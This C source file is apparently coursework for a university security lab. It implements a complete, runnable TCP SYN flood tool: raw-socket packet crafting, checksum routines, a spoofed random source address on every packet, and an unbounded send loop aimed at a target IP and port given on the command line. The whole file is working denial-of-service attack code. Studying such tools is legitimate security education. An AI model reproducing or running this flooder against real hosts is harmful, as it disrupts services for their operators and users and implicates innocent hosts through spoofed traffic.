/*
 * syn_flood.c - High-Performance TCP SYN Flooding Engine using Raw Sockets
 * Course: CSE 406 (Computer Security Sessional) - Topic 06
 * Authors: Shahriar Ahmed Seam (2005093), Hozifa Rahman Hamim (1705083)
 *
 * Implements custom Layer 3 (IPv4) and Layer 4 (TCP) packet crafting with
 * RFC 1071 16-bit Internet Checksum and TCP Pseudo-Header calculation.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PACKET_SIZE 4096

// 12-byte TCP Pseudo Header required for RFC 793 Checksum calculation
struct pseudo_header {
    uint32_t src_ip;
    uint32_t dst_ip;
    uint8_t  placeholder; // Must be 0x00
    uint8_t  protocol;    // IPPROTO_TCP (6)
    uint16_t tcp_length;   // Length of TCP header + payload (in network byte order)
};

// Global statistics counter
static volatile uint64_t g_packets_sent = 0;
static volatile int g_running = 1;

void handle_sigint(int sig) {
    (void)sig;
    g_running = 0;
}

// RFC 1071 16-bit One's Complement Internet Checksum
uint16_t calculate_checksum(uint16_t *buf, int nbytes) {
    uint32_t sum = 0;
    uint16_t oddbyte = 0;

    while (nbytes > 1) {
        sum += *buf++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        *((uint8_t *)&oddbyte) = *(uint8_t *)buf;
        sum += oddbyte;
    }

    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (uint16_t)(~sum);
}

// Compute TCP Checksum over Pseudo-Header + TCP Header
uint16_t compute_tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    char pbuf[PACKET_SIZE];
    struct pseudo_header psh;

    psh.src_ip = iph->saddr;
    psh.dst_ip = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    memcpy(pbuf, &psh, sizeof(struct pseudo_header));
    memcpy(pbuf + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    return calculate_checksum((uint16_t *)pbuf, psize);
}

// Generate valid random unicast IPv4 (filtering loopback 127.0.0.0/8, 0.0.0.0, and multicast)
uint32_t generate_random_ip() {
    uint8_t o1 = 1 + (rand() % 223);
    while (o1 == 127 || o1 == 10 || o1 == 0) {
        o1 = 1 + (rand() % 223);
    }
    uint8_t o2 = rand() % 256;
    uint8_t o3 = rand() % 256;
    uint8_t o4 = 1 + (rand() % 254);
    return htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | o4);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <Target IP> <Target Port> [Duration Seconds]\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = (argc >= 4) ? atoi(argv[3]) : 0;

    signal(SIGINT, handle_sigint);
    srand(time(NULL));

    // Create raw socket specifying raw IPv4 protocol
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[-] Failed to create raw socket (need root / CAP_NET_RAW)");
        return 1;
    }

    // Inform kernel that user space provides the IPv4 header
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("[-] Failed to set IP_HDRINCL");
        close(sock);
        return 1;
    }

    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &sin.sin_addr) <= 0) {
        fprintf(stderr, "[-] Invalid target IP address: %s\n", target_ip);
        close(sock);
        return 1;
    }

    printf("[+] Target: %s:%d\n", target_ip, target_port);
    printf("[+] Packet size: %lu bytes (20B IP + 20B TCP)\n", sizeof(struct iphdr) + sizeof(struct tcphdr));
    printf("[+] Launching SYN flood attack loop...\n");

    time_t start_time = time(NULL);

    while (g_running) {
        memset(packet, 0, sizeof(struct iphdr) + sizeof(struct tcphdr));

        // 1. Populate Layer 3 (IPv4) Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand() % 65535);
        iph->frag_off = htons(0x4000); // DF flag
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = generate_random_ip(); // Spoofed source IP
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = calculate_checksum((uint16_t *)iph, iph->ihl * 4);

        // 2. Populate Layer 4 (TCP) Header
        tcph->source = htons(1024 + (rand() % 64511));
        tcph->dest = htons(target_port);
        tcph->seq = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1; // Assert SYN flag
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(64240);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->check = compute_tcp_checksum(iph, tcph);

        // 3. Transmit packet via Raw Socket
        if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            // If socket buffer is full, yield briefly
            usleep(100);
        } else {
            g_packets_sent++;
        }

        if (duration > 0 && (time(NULL) - start_time) >= duration) {
            break;
        }

        if (g_packets_sent % 10000 == 0) {
            printf("[*] Injected %lu SYN packets...\n", g_packets_sent);
        }
    }

    double elapsed = difftime(time(NULL), start_time);
    if (elapsed <= 0) elapsed = 1.0;
    printf("\n[+] Attack finished.\n");
    printf("[+] Total SYN packets sent: %lu\n", g_packets_sent);
    printf("[+] Elapsed time: %.1f seconds\n", elapsed);
    printf("[+] Average transmission rate: %.1f PPS (Packets/sec)\n", (double)g_packets_sent / elapsed);

    close(sock);
    return 0;
}
